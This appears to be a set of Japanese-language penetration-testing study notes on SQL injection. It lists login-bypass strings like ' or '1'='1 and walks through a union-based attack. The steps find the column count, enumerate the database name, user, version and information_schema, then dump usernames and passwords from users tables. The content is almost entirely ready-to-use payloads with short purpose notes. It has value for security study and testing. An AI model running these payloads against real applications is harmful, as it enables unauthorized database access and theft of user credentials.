ブラウザに入力し、エラーの出力を見て脆弱性があるか確認
# 有効性のチェック
- `' or '1'='1';--`を入力し、通常の入力時と挙動の違いがあるかを**BurpSuite**などのツールを使って確認します。

#### 例として使用可能なSQLインジェクション入力
```
admin' or '1'='1
```
```
'or '1'='1 --
```
```
`"or "1"="1`
```
```
"or "1"="1" --
```
```
") or "1"="1 --`
```
```
"or 1=1 --
```

```
offsec' OR 1=1 -- //
```
```
' or 1=1 in (select @@version) -- //
```
```
' OR 1=1 in (SELECT * FROM users) -- //
```
```
' or 1=1 in (SELECT password FROM users) -- //
```
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

---
### カラム数の特定
1. SQLインジェクションの脆弱性が発見されたら、生成されるクエリを予想する
- Example
```bash
select id, name, position, phone, email from table where name="{input}"
```

2. 数を変えながら繰り返し、エラーにならない数を探す。

- Example
- `' union select null;--`を入力し、カラム数に関するエラーが出た場合は、以下のように徐々にカラム数を増やして特定します。
  
```bash
' union select null, null, null, null, null;--
```
```bash
' or 1=1 order by 10 #
```
```bash
' or 1=1 order by 9 #
```
```bash
' or 1=1 order by 8 #
```
3. 特定できたらUnion Based SQLインジェクションにつなげる。
---
**Union Based SQL Injection**とは、`union`を使って行を挿入し、内部情報を抽出する手法です。
# Union Based SQLの流れ
1. 数字を増やしながらカラム数を特定
```bash
' ORDER BY 1-- //
```

2. 特定したカラム数から列を表`
```bash
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```

3. 現在のデータベース名、ユーザー、および MySQL バージョンを列挙
```bash
%' UNION SELECT database(), user(), @@version, null, null -- //
```

4. 上記でうまく出力されない場合は型の不一致が起きている可能性があるのでnullの箇所をずらしてみる
```bash
' UNION SELECT null, null, database(), user(), @@version  -- //
```

5. 現在のデータベースに他のテーブルが存在するかどうかを確認
```bash
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

6. 
```bash
' UNION SELECT null, username, password, description, null FROM users -- //
```


#### Unionの具体例と説明

7. **現在のユーザー、データベース、バージョン情報の取得**
```bash
   ' or 1=1 union select 1,2,3,user(),database(),version();#
```
   - 目的: データベースサーバーにログインしているユーザー名、現在使用しているデータベース名、およびサーバーのバージョン情報を取得します。

2. **データベースの一覧を取得**
```bash
   ' or 1=1 union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata;#
```
   - 目的: データベースサーバーに存在するすべてのデータベース名を取得します。`information_schema.schemata`は、データベース名を保持するテーブルです。

3. **特定のテーブルのカラム名を取得**
```bash
   ' or 1=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='Users';#
```
   - 目的: `Users`という名前のテーブルに含まれるカラム（列）の名前を取得します。`information_schema.columns`は、すべてのテーブルのカラム情報を保持するテーブルです。

4. **特定のテーブルからユーザーID、ユーザー名、パスワードを抽出**
```bash
   ' or 1=1 union select 1,2,group_concat(UserID),group_concat(Username),group_concat(Password),6 from Users;#
```
   - 目的: `Users`テーブルからユーザーID、ユーザー名、およびパスワード情報をまとめて取得します。複数のデータを`group_concat`関数で連結しています。

5. **特定のデータベースのテーブル名を取得**
```bash
   ' or 1=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='users';#
```
   - 目的: `users`データベースに含まれるすべてのテーブル名を取得します。`information_schema.tables`は、すべてのデータベース内のテーブル情報を保持するテーブルです。

6. **特定のテーブルのカラム名を取得（具体例: UserDetailsテーブル）**
```bash
   ' or 1=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='UserDetails';#
```
   - 目的: `UserDetails`という名前のテーブルに含まれるカラム（列）の名前を取得します。この例では、`id`, `firstname`, `lastname`, `username`, `password`, `reg_date`といったカラムが含まれます。

7. **ユーザー名とパスワードの取得（具体例: UserDetailsテーブル）**
```bash
   ' or 1=1 union select 1,2,3,group_concat(username),group_concat(password),6 from users.UserDetails;#
```
   - 目的: `UserDetails`テーブルからすべてのユーザー名とパスワードを取得します。`group_concat`関数を使用して、複数のユーザー情報をまとめて抽出しています。

---
